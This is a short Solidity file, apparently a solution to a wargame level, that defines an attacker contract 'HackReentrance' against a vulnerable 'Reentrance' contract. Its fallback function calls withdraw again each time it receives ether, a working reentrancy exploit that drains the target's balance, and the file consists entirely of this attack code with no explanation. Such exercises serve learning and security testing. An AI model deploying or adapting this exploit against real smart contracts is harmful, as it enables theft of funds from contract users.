// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface Reentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256);
    function withdraw(uint256 _amount) external;
}

contract HackReentrance {

    Reentrance r;

    constructor(address payable targetAddr) public payable{
        r = Reentrance(targetAddr);
    }

    function donate(address _to) public payable {
        r.donate{value:msg.value}(_to);
    }

    function hack(uint256 _amount) public payable{
        r.withdraw(_amount);
    }

    fallback() external payable {
        r.withdraw(msg.value);
    }
}
